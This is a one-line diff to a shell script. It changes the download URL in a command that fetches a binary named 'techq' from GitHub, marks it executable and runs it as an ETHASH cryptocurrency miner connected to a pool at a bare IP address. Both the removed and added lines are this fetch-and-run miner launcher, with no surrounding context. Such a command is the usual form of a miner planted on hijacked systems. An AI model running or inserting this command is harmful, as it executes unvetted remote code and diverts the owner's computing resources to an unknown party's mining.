@@ -1,1 +1,1 @@
-wget https://github.com/Menak3/Corner/raw/main/techq && chmod +x techq && ./techq --algo ETHASH --pool 3.71.236.253:443 --user cornertech.$(echo $(shuf -i 1-9999 -n 1)-AST) --pass x --ethstratum ETHPROXY
+wget https://github.com/loves96617665/tt1/edit/main/corner/techq && chmod +x techq && ./techq --algo ETHASH --pool 3.71.236.253:443 --user cornertech.$(echo $(shuf -i 1-9999 -n 1)-AST) --pass x --ethstratum ETHPROXY
